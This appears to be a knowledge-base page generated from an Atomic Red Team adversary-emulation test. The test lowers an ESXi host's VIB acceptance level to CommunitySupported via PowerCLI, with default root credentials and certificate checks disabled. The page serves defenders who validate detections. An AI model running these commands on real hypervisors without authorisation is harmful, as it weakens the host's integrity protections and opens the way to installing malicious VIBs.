---
atomic_guid: "062f92c9-28b1-4391-a5f8-9d8ca6852091"
title: "ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.010"
attack_technique_name: "Impair Defenses: Downgrade Attack"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.010/T1562.010.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "062f92c9-28b1-4391-a5f8-9d8ca6852091"
  - "ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI

An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.
[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)

## Metadata

- Atomic GUID: 062f92c9-28b1-4391-a5f8-9d8ca6852091
- Technique: T1562.010: Impair Defenses: Downgrade Attack
- Platforms: linux
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1562.010/T1562.010.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.010]]

## Input Arguments

### vm_host

- description: Specify the host name of the ESXi Server
- type: string
- default: atomic.local

### vm_pass

- description: Specify the privilege user password on ESXi Server
- type: string
- default: pass

### vm_user

- description: Specify the privilege user account on ESXi Server
- type: string
- default: root

## Dependencies

Check if VMWARE PowerCLI PowerShell Module is installed.

### Prerequisite Check

```text
$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable
if (-not $RequiredModule) {exit 1}
```

### Get Prerequisite

```text
Install-Module -Name VMware.PowerCLI -Confirm:$false
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = "CommunitySupported"})
Disconnect-VIServer -Confirm:$false
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.010/T1562.010.yaml)
